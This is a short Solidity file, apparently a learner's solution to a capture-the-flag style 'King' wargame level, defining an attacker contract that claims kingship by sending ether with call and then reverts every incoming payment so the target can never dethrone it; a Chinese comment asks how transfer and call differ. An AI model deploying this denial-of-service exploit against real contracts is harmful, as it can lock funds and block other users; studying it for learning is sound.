// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import "./King.sol";

contract KingAttacker {
    address payable public king;

    constructor(address _addr) {
        king = payable(_addr);
    }

    receive() external payable {
        revert("You can't claim to be King!");
    }

    function attack() external payable {
        require(msg.value > 10 ether, "Not enough money to be king");
        // TODO
        // 这里这两个语法的区别？
        // king.transfer(msg.value);
        king.call{value: msg.value}("");
    }
}
